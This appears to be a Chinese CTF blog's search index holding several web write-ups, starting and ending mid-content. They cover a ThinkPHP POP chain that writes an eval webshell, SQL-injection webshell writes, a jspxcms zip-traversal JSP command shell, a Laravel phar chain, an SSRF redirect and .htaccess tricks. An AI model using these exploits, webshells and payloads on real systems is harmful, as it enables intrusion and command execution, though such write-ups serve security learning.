3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;00z&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00w&#x3D;00c&#x3D;00m&#x3D;009&#x3D;00j&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;00z&#x3D;00b&#x3D;003&#x3D;00J&#x3D;00z&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00h&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;006&#x3D;00e&#x3D;002&#x3D;00k&#x3D;006&#x3D;00M&#x3D;00D&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00N&#x3D;001&#x3D;00c&#x3D;00n&#x3D;00J&#x3D;00l&#x3D;00b&#x3D;00n&#x3D;00Q&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00n&#x3D;00B&#x3D;00o&#x3D;00c&#x3D;00G&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;008&#x3D;00i&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00f&#x3D;00Q&#x3D;00U&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00k&#x3D;00d&#x3D;00W&#x3D;001&#x3D;00t&#x3D;00e&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00B&#x3D;00W&#x3D;00w&#x3D;001&#x3D;00h&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00x&#x3D;00+&#x3D;00f&#x3D;009&#x3D;00i&#x3D;00k&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00L&#x3D;00n&#x3D;00R&#x3D;004&#x3D;00d&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00B&#x3D;00W&#x3D;00w&#x3D;001&#x3D;00h&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00x&#x3D;00+&#x3D;00f&#x3D;009&#x3D;00i&#x3D;00k&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00H&#x3D;00R&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00R&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00N&#x3D;00S&#x3D;00Q&#x3D;00g&#x3D;00s&#x3D;00A&#x3D;002&#x3D;00D&#x3D;00L&#x3D;00z&#x3D;001&#x3D;00J&#x3D;00O&#x3D;00Z&#x3D;00G&#x3D;00X&#x3D;00F&#x3D;00D&#x3D;00D&#x3D;009&#x3D;00+&#x3D;00D&#x3D;00r&#x3D;00m&#x3D;00V&#x3D;00e&#x3D;00g&#x3D;00C&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00R&#x3D;000&#x3D;00J&#x3D;00N&#x3D;00Q&#x3D;00g&#x3D;00&#x3D;3D&#x3D;00&#x3D;3D 按照上面步骤，最终实现phar反序列化 换payload，得到根目录结构 读取flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php反序列化","slug":"CTF/php反序列化","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"phar反序列化","slug":"phar反序列化","permalink":"https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php://filter过滤器巧妙利用","slug":"php-filter过滤器巧妙利用","permalink":"https://123-prog.github.io/tags/php-filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/"}]},{"title":"DAS x CBCTF 部分web wp","slug":"DAS-x-CBCTF-部分web-wp","date":"2021-08-01T14:32:27.000Z","updated":"2021-09-22T10:18:25.259Z","comments":true,"path":"2021/08/01/DAS-x-CBCTF-部分web-wp/","link":"","permalink":"https://123-prog.github.io/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/","excerpt":"0x01 ez_website在index下的Labelmodels.php控制器，其中的get_label方法，获取数据，在没有任何过滤的情况下对数据进行反序列化","text":"0x01 ez_website在index下的Labelmodels.php控制器，其中的get_label方法，获取数据，在没有任何过滤的情况下对数据进行反序列化 thinkphp 5.0.18，找条pop链 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;?phpnamespace think\\process\\pipes &#123; class Windows &#123; private $files = []; public function __construct($files) &#123; $this-&gt;files = [$files]; //$file =&gt; /think/Model的子类new Pivot(); Model是抽象类 &#125; &#125;&#125;namespace think &#123; abstract class Model&#123; protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) &#123; $this-&gt;parent = $output; //$this-&gt;parent=&gt; think\\console\\Output; $this-&gt;append = array(&quot;xxx&quot;=&gt;&quot;getError&quot;); //调用getError 返回this-&gt;error $this-&gt;error = $modelRelation; // $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne &#125; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model&#123; function __construct($output, $modelRelation) &#123; parent::__construct($output, $modelRelation); &#125; &#125;&#125;namespace think\\model\\relation&#123; class HasOne extends OneToOne &#123; &#125;&#125;namespace think\\model\\relation &#123; abstract class OneToOne &#123; protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) &#123; $this-&gt;selfRelation = 0; $this-&gt;query = $query; //$query指向Query $this-&gt;bindAttr = [&#x27;xxx&#x27;];// $value值，作为call函数引用的第二变量 &#125; &#125;&#125;namespace think\\db &#123; class Query &#123; protected $model; function __construct($model) &#123; $this-&gt;model = $model; //$this-&gt;model=&gt; think\\console\\Output; &#125; &#125;&#125;namespace think\\console&#123; class Output&#123; private $handle; protected $styles; function __construct($handle) &#123; $this-&gt;styles = [&#x27;getAttr&#x27;]; $this-&gt;handle =$handle; //$handle-&gt;think\\session\\driver\\Memcached &#125; &#125;&#125;namespace think\\session\\driver &#123; class Memcached &#123; protected $handler; function __construct($handle) &#123; $this-&gt;handler = $handle; //$handle-&gt;think\\cache\\driver\\File &#125; &#125;&#125;namespace think\\cache\\driver &#123; class File &#123; protected $options=null; protected $tag; function __construct()&#123; $this-&gt;options=[ &#x27;expire&#x27; =&gt; 3600, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; =&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../public/uploads/a.php&#x27;, &#x27;data_compress&#x27; =&gt; false, ]; $this-&gt;tag = &#x27;xxx&#x27;; &#125; &#125;&#125;namespace &#123; $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window));&#125; 这个pop链可以在指定目录生成shell文件，shell文件名为a.php+md5(&#39;tag_&#39;+md5($this-&gt;tag)).php 在网站根目录写文件会失败，估计没给根目录写的权限，所以换个目录，我用的/public/uploads/，存放上传文件的目录总归有权限吧 payload 1http:&#x2F;&#x2F;62a40bd3-4929-4334-a22c-0eb3b4029324.node4.buuoj.cn&#x2F;index.php&#x2F;index&#x2F;labelmodels&#x2F;get_label?tag_array[cfg]&#x3D;O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A137%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fpublic%2Fuploads%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D 123访问&#x2F;public&#x2F;uploads&#x2F;a.php12ac95f1498ce51d2d96a249c09c1998.phppost ccc&#x3D;system(&#39;&#x2F;readflag&#39;);拿到flag 0x02 cybercmswww.zip源码泄露 后台/admin，登录处存在sql注入漏洞 主要的验证逻辑 fl_value,f1_vvv,f1_html对输入做了个过滤 都是简单的过滤，对关键字替换为空，双写即可绕过 但flag没在数据库内，由flag.sh可知flag在根目录，所以这里利用的是sql写shell 为了防止f1_html对我们插入一句话中的特殊字符进行转义，这里利用char函数 1user&#x3D;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;selselectect&#x2F;**&#x2F;null,null,null,null,char(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;outoutfilefile&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;#&amp;password&#x3D;122&amp;code&#x3D;&amp;submit&#x3D;true&amp;submit.x&#x3D;61&amp;submit.y&#x3D;32 123访问 &#x2F;shell.phppost cmd&#x3D;system(&#39;cat &#x2F;flag.txt&#39;);即可拿flag 0x03 jspxcms找到后台 /cmscp/index.do 账号默认是admin，密码默认为空 在后台有一处上传文件，并可以对上传的zip进行解压，这里不能直接上传jsp，而且jspxcms对jsp的访问有限制，访问jsp文件就直接403 这里存在目录穿越的漏洞，可以构造zip包路径为shell.zip/../../../shell.war，这样子解压后的shell.war就会到webapps目录下，利用其项目部署，war包自动解压的特点，成功将其中的shell文件写到服务器 写一个shell.jsp 木马 123456789101112&lt;% if(&quot;c4t&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt; jar -cvf shell.war shell.jsp 生成shell.war，然后构造zip 生成zip的脚本 12345678910111213141516import zipfileimport osbinary = open(&#x27;shell.war&#x27;,&#x27;rb&#x27;).read()#print(binary)if os.path.exists(&#x27;./test.zip&#x27;): os.system(&#x27;rm -rf ./test.zip&#x27;)if __name__ == &quot;__main__&quot;: try: zipFile = zipfile.ZipFile(&quot;test.zip&quot;, &quot;a&quot;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(&quot;test.zip&quot;) zipFile.writestr(&quot;../../../shell.war&quot;, binary) zipFile.close() except IOError as e: raise e 上传文件并解压 访问/shell/shell.jsp?pwd=c4t&amp;cmd=cat /flag 得到flag","categories":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"}],"tags":[{"name":"DAS x CBCTF","slug":"DAS-x-CBCTF","permalink":"https://123-prog.github.io/tags/DAS-x-CBCTF/"}]},{"title":"(HMBCTF 2021)EzLight","slug":"HMBCTF-2021-EzLight","date":"2021-07-30T12:18:50.000Z","updated":"2021-09-22T10:18:07.809Z","comments":true,"path":"2021/07/30/HMBCTF-2021-EzLight/","link":"","permalink":"https://123-prog.github.io/2021/07/30/HMBCTF-2021-EzLight/","excerpt":"0x01 phar上传点以admin:admin登录进入后台，在内容管理处，新建文章内容，会有一处可以上传封面图的地方，经过测试，对phar文件稍加修改可以伪造成图片上传，而且路径也是已知的","text":"0x01 phar上传点以admin:admin登录进入后台，在内容管理处，新建文章内容，会有一处可以上传封面图的地方，经过测试，对phar文件稍加修改可以伪造成图片上传，而且路径也是已知的 0x02 触发phar反序列化的点除了上传文件的接口/admin/neditor/serve/uploadimage外，还有一个可用于远程加载文件的接口 /admin/neditor/serve/catchimage 会对POST的file参数调用fetchImageFile，进一步跟进 通过curl获取远程文件内容，存在$data中，我们可以利用这一点获取到自己服务器上的文件，从而控制data 跟进Image::make 在vendor/intervention/image/src/Intervention/Image/ImageManager.php可以看到make的定义 继续跟进 最终是调用的AbstractDecoder.php中的init() 在isUrl()中，跟进initFromUrl 可以看到有file_get_contents操作，触发点就找到了 0x03 利用链lightCMS基于Laravel 6.x开发，但Laravejitiaol5.x的那几条链也好像都可以用 随便选一条链，生成phar文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpnamespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($function, $parameter) &#123; $this-&gt;events = new \\Illuminate\\Bus\\Dispatcher($function); $this-&gt;event = new \\Illuminate\\Queue\\CallQueuedClosure($parameter); &#125; &#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher &#123; protected $queueResolver; public function __construct($function) &#123; $this-&gt;queueResolver = $function; &#125; &#125;&#125;namespace Illuminate\\Queue&#123; class CallQueuedClosure &#123; protected $connection; public function __construct($parameter) &#123; $this-&gt;connection = $parameter; &#125; &#125;&#125;namespace&#123; $function = &#x27;system&#x27;; $parameter = &#x27;cat /flag&#x27;; $data = new \\Illuminate\\Broadcasting\\PendingBroadcast( $function, $parameter ); $phar = new Phar(&#x27;phar.phar&#x27;); $phar -&gt; stopBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;); $phar -&gt; setMetadata($data); $phar -&gt; stopBuffering(); rename(&#x27;phar.phar&#x27;,&#x27;phar.jpg&#x27;);&#125; 0x04上传phar文件 在自己的vps上开个http服务，存放phar.txt文件，内容为 1phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;image&#x2F;202107&#x2F;pkCycjoTZSOQbtpygAFQvdr0DhQ8gv2ZDk3aGyKj.gif 这里不要用vim编辑，否则curl读取到的内容后面会多一个\\n，在后面解析的时候isUrl过不去 post file参数，读取vps文件，触发phar反序列化，拿到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php反序列化","slug":"CTF/php反序列化","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"phar反序列化","slug":"phar反序列化","permalink":"https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"LightCMS 后台RCE漏洞","slug":"LightCMS-后台RCE漏洞","permalink":"https://123-prog.github.io/tags/LightCMS-%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/"}]},{"title":"(JMCTF 2021)GoOSS","slug":"JMCTF-2021-GoOSS","date":"2021-07-29T14:47:47.000Z","updated":"2021-09-22T10:16:44.372Z","comments":true,"path":"2021/07/29/JMCTF-2021-GoOSS/","link":"","permalink":"https://123-prog.github.io/2021/07/29/JMCTF-2021-GoOSS/","excerpt":"0x0180端口有index.php","text":"0x0180端口有index.php 1234&lt;?php// php in localhost port 80readfile($_GET[&#x27;file&#x27;]);?&gt; 阅读源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157package mainimport ( &quot;bytes&quot; &quot;crypto/md5&quot; &quot;encoding/hex&quot; &quot;github.com/gin-gonic/gin&quot; &quot;io&quot; &quot;io/ioutil&quot; &quot;net/http&quot; &quot;os&quot; &quot;strings&quot; &quot;time&quot;)type File struct &#123; Content string `json:&quot;content&quot; binding:&quot;required&quot;` Name string `json:&quot;name&quot; binding:&quot;required&quot;`&#125;type Url struct &#123; Url string `json:&quot;url&quot; binding:&quot;required&quot;`&#125;func md5sum(data string) string&#123; s := md5.Sum([]byte(data)) return hex.EncodeToString(s[:])&#125;func fileMidderware (c *gin.Context)&#123; fileSystem := http.Dir(&quot;./files/&quot;) if c.Request.URL.String() == &quot;/&quot;&#123; c.Next() return &#125; f,err := fileSystem.Open(c.Request.URL.String()) if f == nil &#123; c.Next() &#125; // if err != nil &#123; c.Next() return &#125; defer f.Close() fi, err := f.Stat() if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;) return &#125; if fi.IsDir() &#123; if !strings.HasSuffix(c.Request.URL.String(), &quot;/&quot;) &#123; c.Redirect(302,c.Request.URL.String()+&quot;/&quot;) &#125; else &#123; files := make([]string,0) l,_ := f.Readdir(0) for _,i := range l &#123; files = append(files, i.Name()) &#125; c.JSON(http.StatusOK, gin.H&#123; &quot;files&quot; :files, &#125;) &#125; &#125; else &#123; data,_ := ioutil.ReadAll(f) c.Header(&quot;content-disposition&quot;, `attachment; filename=` + fi.Name()) c.Data(200, &quot;text/plain&quot;, data) &#125;&#125;func uploadController(c *gin.Context) &#123; var file File if err := c.ShouldBindJSON(&amp;file); err != nil &#123; c.JSON(500, gin.H&#123;&quot;msg&quot;: err&#125;) return &#125; dir := md5sum(file.Name) _,err:= http.Dir(&quot;./files&quot;).Open(dir) if err != nil&#123; e := os.Mkdir(&quot;./files/&quot;+dir,os.ModePerm) _, _ = http.Dir(&quot;./files&quot;).Open(dir) if e != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: e.Error()&#125;) return &#125; &#125; filename := md5sum(file.Content) path := &quot;./files/&quot;+dir+&quot;/&quot;+filename err = ioutil.WriteFile(path, []byte(file.Content), os.ModePerm) if err != nil&#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;) return &#125; c.JSON(200, gin.H&#123; &quot;message&quot;: &quot;file upload succ, path: &quot;+dir+&quot;/&quot;+filename, &#125;)&#125;func vulController(c *gin.Context) &#123; var url Url if err := c.ShouldBindJSON(&amp;url); err != nil &#123; c.JSON(500, gin.H&#123;&quot;msg&quot;: err&#125;) return &#125; if !strings.HasPrefix(url.Url,&quot;http://127.0.0.1:1234/&quot;)&#123; c.JSON(403, gin.H&#123;&quot;msg&quot;: &quot;url forbidden&quot;&#125;) return &#125; client := &amp;http.Client&#123;Timeout: 2 * time.Second&#125; resp, err := client.Get(url.Url) if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;) return &#125; defer resp.Body.Close() var buffer [512]byte result := bytes.NewBuffer(nil) for &#123; n, err := resp.Body.Read(buffer[0:]) result.Write(buffer[0:n]) if err != nil &amp;&amp; err == io.EOF &#123; break &#125; else if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;) return &#125; &#125; c.JSON(http.StatusOK, gin.H&#123;&quot;data&quot;: result.String()&#125;)&#125;func main() &#123; r := gin.Default() r.Use(fileMidderware) r.POST(&quot;/vul&quot;,vulController) r.POST(&quot;/upload&quot;,uploadController) r.GET(&quot;/&quot;, func(c *gin.Context) &#123; c.JSON(200, gin.H&#123; &quot;message&quot;: &quot;pong&quot;, &#125;) &#125;) _ = r.Run(&quot;:1234&quot;) // listen and serve on 0.0.0.0:8080&#125; 123&#x2F;upload 上传文件的&#x2F;vul 代理路由，可以通过这里实现SSRF,要求url前缀为http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;现在就是如何绕过这个限制，访问到80端口 0x02注意到有个重定向 需要满足c.Request.URL.String()是一个目录而不是文件名，我们需要在file下有文件夹 上传文件可以帮你完成这个目标 payload 1&#123;&quot;Url&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php?file&#x3D;&#x2F;flag&amp;a&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;098f6bcd4621d373cade4e832627b4f6&quot;&#125; 这个payload，利用目录穿越的特点，保持访问这个目录的存在，重定向//127.0.0.1:80","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"golang web","slug":"CTF/golang-web","permalink":"https://123-prog.github.io/categories/CTF/golang-web/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://123-prog.github.io/tags/ssrf/"},{"name":"重定向","slug":"重定向","permalink":"https://123-prog.github.io/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"}]},{"title":"(JMCTF 2021)UploadHub","slug":"JMCTF-2021-UploadHub","date":"2021-07-29T04:11:22.000Z","updated":"2021-09-22T10:16:28.187Z","comments":true,"path":"2021/07/29/JMCTF-2021-UploadHub/","link":"","permalink":"https://123-prog.github.io/2021/07/29/JMCTF-2021-UploadHub/","excerpt":"0x01","text":"0x01 给了源码和一些配置文件，源码有关sql部分都是迷惑人的，这题是文件上传的题 在apache2.conf中， 123&lt;Directory ~ &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;[a-f0-9]&#123;32&#125;&#x2F;&quot;&gt; php_flag engine off&lt;&#x2F;Directory&gt; 上传目录下的php解析被关闭了 但是又注意到 12345&lt;Directory &#x2F;var&#x2F;www&#x2F;&gt; Options Indexes FollowSymLinks AllowOverride All Require all granted&lt;&#x2F;Directory&gt; AllowOverride被设置All，这个值为None的时候是不会搜索这个目录下的.htaccess文件的，但这里代表我们可以通过上传.htaccess文件更改上传目录的配置，那前面的解析关闭就不是问题了 0x02 上传.htaccess文件1234567&lt;FilesMatch &quot;.htaccess&quot;&gt;SetHandler application&#x2F;x-httpd-phpRequire all grantedphp_flag engine 1&lt;&#x2F;FilesMatch&gt;#&lt;?php readfile(&#39;&#x2F;flag&#39;);?&gt; php_flag更改配置engine的布尔值，启动php解析，这里php_flag不能放在FilesMatch外面大概是优先级问题，待研究 .htaccess的使用，可以参考这个https://cloud.tencent.com/developer/article/1824057 除此之外php_value也可以更改配置（不可以更改布尔值） 当php是作为apache的模块作用时，可以在apache配置文件中使用它们更改php的配置 当然不是所有配置都可以通过这个方式更改，哪些可以更改的可以查一下官方文档 payload这里可能有点绕，上面的payload的作用过程应该是这样的 1231.请求upload下的.htaccess2.根据配置，开启了.htaccess的使用，apache就会寻找这个目录下的.htaccess文件，应用其中配置，我们在其中写了一个文件匹配，匹配.htaccess文件，我们访问的就是这个文件，所以匹配成功，应用FilesMatch中的配置，为.htaccess指定处理器为php，开启engine3.这时候的.htaccess已经被当作php文件来看了，所以在下面写php代码，可以解析 另外，在start.sh中有 靶机每1分钟会清理一下上传文件夹的文件，如果上传后访问发现文件不存在，那就是被删了，再试一遍 上传访问，即可拿到flag 0x03 第二种解法来自Nu1l的解法，马克一下 先看一下主要的payload形式 123&lt;If &quot;file(&#39;&#x2F;flag&#39;)&#x3D;~ &#x2F;flag&#123;&#x2F;&quot;&gt;ErrorDocument 404 &quot;wupco&quot;&lt;&#x2F;If&gt; 1234567file():Read contents from a file (including line endings, when present)file()可以读取文件内容word &quot;&#x3D;~&quot; regex&#x3D;~表示正则匹配ErrorDocument 404 &quot;wupco&quot;:在访问不存在页面的时候返回“wupco” 其他一些函数和表达式可以在文档里面查看 http://httpd.apache.org/docs/2.4/expr.html 由此可以开始注入 exp.py 123456789101112131415161718192021222324import requestsimport stringurl = &#x27;http://b17d4c2d-6d9d-43fa-8179-558e860c80e4.node4.buuoj.cn/&#x27;myIp = &#x27;ebfb2fa6fd1346df575fb4a07e818f3b&#x27;alp = string.ascii_letters+string.digits+&#x27;&#123;-&#125;&#x27;#print(alp)flag = &#x27;&#x27;fileContent = &#x27;&#x27;&#x27;&lt;If &quot;file(&#x27;/flag&#x27;)=~ /^%s/&quot;&gt;ErrorDocument 404 &quot;wupco&quot;&lt;/If&gt;&#x27;&#x27;&#x27;for i in range(50): for c in alp: htaccess = fileContent%(flag+c) r1 = requests.post(url+&#x27;/index.php&#x27;, data=&#123;&#x27;submit&#x27;:&#x27;submit&#x27;&#125;, files=&#123;&#x27;file&#x27;:(&#x27;.htaccess&#x27;,htaccess)&#125;) r2 = requests.get(url+&#x27;/upload/&#x27;+myIp+&#x27;/a&#x27;) if &quot;wupco&quot; in r2.text: flag += c print(flag) break","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"文件上传","slug":"CTF/文件上传","permalink":"https://123-prog.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":".htaccess","slug":"htaccess","permalink":"https://123-prog.github.io/tags/htaccess/"},{"name":"文件上传","slug":"文件上传","permalink":"https://123-prog.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"(HFCTF 2021 Final)hatenum","slug":"HFCTF-2021-Final-hatenum","date":"2021-07-28T08:17:54.000Z","updated":"2021-09-22T10:15:42.280Z","comments":true,"path":"2021/07/28/HFCTF-2021-Final-hatenum/","link":"","permalink":"https://123-prog.github.io/2021/07/28/HFCTF-2021-Final-hatenum/","excerpt":"0x01","text":"0x01 源码很简单 home.php 123456789101112&lt;?phprequire_once(&#x27;config.php&#x27;);if(!$_SESSION[&#x27;username&#x27;])&#123; header(&#x27;location:index.php&#x27;);&#125;if($_SESSION[&#x27;username&#x27;]==&#x27;admin&#x27;)&#123; echo file_get_contents(&#x27;/flag&#x27;);&#125;else&#123; echo &#x27;hello &#x27;.$_SESSION[&#x27;username&#x27;];&#125;?&gt; 要以admin登录 login.php 123456789101112131415161718192021222324&lt;?phprequire_once(&#x27;config.php&#x27;);array_waf($_POST);if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;code&#x27;]))&#123; $User = new User(); switch ($User-&gt;login($_POST[&#x27;username&#x27;],$_POST[&#x27;password&#x27;],$_POST[&#x27;code&#x27;])) &#123; case &#x27;success&#x27;: echo &#x27;login success&#x27;; header(&#x27;location:home.php&#x27;); break; case &#x27;fail&#x27;: echo &#x27;login fail&#x27;; header(&#x27;location:index.php&#x27;); break; case &#x27;error&#x27;: echo &#x27;error&#x27;; header(&#x27;location:index.php&#x27;); break; &#125;&#125;else&#123; die(&#x27;no use&#x27;);&#125;?&gt; 调用User-&gt;login() 没有用预处理，可以注入，存在过滤 123&#x2F;union|select|or|and|\\&#39;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|&#x3D;|&gt;|&lt;| |\\*|,|;|\\r|\\n|\\t|substr|right|left|mid&#x2F;i\\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;&#x2F;i 过滤了单引号，可以用转义符，联合逃逸 利用exp(710)溢出报错，在查询语句出错的时候会返回一个error，没有出错就是登录失败的信息提醒 payload: 12345data = &#123; &#x27;username&#x27;:&#x27;xxx\\\\&#x27;, &#x27;password&#x27;:&#x27;||username rlike 0x61646d69&amp;&amp;exp(710-(24-length(code)))#&#x27;.replace(&#x27; &#x27;,&#x27;\\x0b&#x27;), &#x27;code&#x27;:&#x27;1&#x27;&#125; 得到admin的code长度为23 接下来爆code 主要限制了这个十六进制串的长度变得有点棘手(因为code中有重复子串 看网上大佬的方法，是从前往后匹配一遍，再从后往前匹配一遍，结合分析可以拿到长度23的code 从前往后匹配 12345678910111213141516171819202122232425262728293031#coding=utf-8import requestsimport 